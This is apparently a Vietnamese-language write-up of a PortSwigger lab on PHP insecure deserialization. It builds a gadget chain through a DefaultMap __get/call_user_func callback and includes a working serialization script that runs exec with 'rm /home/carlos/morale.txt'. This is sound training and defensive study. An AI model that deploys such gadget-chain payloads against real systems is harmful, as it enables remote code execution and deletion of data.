# Target Goal: 

This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory.

Credentials: `wiener:peter`

# Recon: 

Sau khi login, ta sẽ có session được cấp: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/4e4c9987-38c4-418c-b3b3-4f790400557c)

Thử đem đi dcode sang b64 và nhận được session được:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/db89515f-b755-4553-afa4-fce4da779aec)

Khi vào `Site map` ta thấy có một path ẩn, send to `Repeater` thì nhận được nội dung sau:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/3413863f-9e6f-42be-8471-49220f6d5a69)

```
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```
- Khi 1 object được serialized thông qua CustomTemplate thì `__wakeup()`  → Hàm build_product():

   + Để tạo Product mới thì build_product() khởi tạo object Product($default_desc_type, $desc) → Hàm __construct() của class Product 

   + Bên trong hàm contruct tham chiếu $desc->$default_desc_type (tham số của CustomTemplate)

- Về phía DefaultMap :

   + Chạy hàm get() nếu có thuộc tính không tồn tại trong Object này

   + get() sẽ tiếp tục gọi tới call_user_func()

   + Tại call_user_func(), mọi hàm được truyền vào sẽ thực thi dựa vào tham số $name

-> Nếu $desc là một DefaultMap object và $default_desc_type chính là tham số $name trong hàm __get(), thì $desc->$default_desc_type sẽ trở thành call_user_func($callback, $default_desc_type); 

Và khi callback là 1 hàm như eval hay exec, ta có thể thực thi lệnh OS với câu lệnh đặt ở $default_desc_type.

Chúng ta sẽ tạo 1 object CustomeTemplate như sau:
```
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```
Viết script dựng lại các obbject cùng tuộc tính của chúng sau đo sử dụng hàm serialize trong php:
```
<?php

class DefaultMap {
    public $callback;
}

class CustomTemplate {
    public $default_desc_type;
    public $desc;
}

$b = new DefaultMap();
$b->callback = "exec";

$a = new CustomTemplate();
$a->default_desc_type = "rm /home/carlos/morale.txt";
$a->desc = $b;

$payload = serialize($a);
print_r($payload);
?>
```
![image](https://github.com/vanniichan/Portswigger/assets/112863484/f968ede4-5907-4d97-95e6-52d45af8bd5e)

Thay value mà ta ecode được vào web ta được: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/8e17c7ec-0c77-44f1-84d0-f814ed817559)

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/620ad878-d113-46d1-9f89-37cc3e3ee736)
